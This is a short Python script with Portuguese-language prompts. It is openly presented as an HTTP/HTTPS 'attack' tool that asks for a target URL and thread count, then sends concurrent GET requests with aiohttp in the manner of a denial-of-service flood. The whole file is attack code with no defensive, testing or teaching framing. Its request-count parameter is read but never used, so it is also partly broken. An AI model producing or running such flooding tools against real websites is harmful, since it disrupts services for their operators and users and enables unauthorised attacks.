import aiohttp
import asyncio

async def send_request(url, session):
    try:
        async with session.get(url) as response:
            pass  # Pode adicionar lógica de processamento da resposta aqui
    except Exception as e:
        print(f"Erro ao enviar solicitação: {e}")

async def attack(url, num_requests, num_threads):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(num_threads):
            task = asyncio.ensure_future(send_request(url, session))
            tasks.append(task)

        await asyncio.gather(*tasks)

async def main():
    print("Selecione o tipo de ataque:")
    print("1. Ataque HTTP")
    print("2. Ataque HTTPS")
    choice = await asyncio.to_thread(lambda: int(input("Digite o número da sua escolha: ")))

    if choice == 1:
        url = input("Insira o URL alvo: ")
        num_requests = int(input("Insira o número de solicitações por thread: "))
        num_threads = int(input("Insira o número de threads: "))
        await attack(url, num_requests, num_threads)
    elif choice == 2:
        url = input("Insira o URL alvo (HTTPS): ")
        num_requests = int(input("Insira o número de solicitações por thread: "))
        num_threads = int(input("Insira o número de threads: "))
        await attack(url, num_requests, num_threads)
    else:
        print("Opção inválida")

if __name__ == "__main__":
    asyncio.run(main())
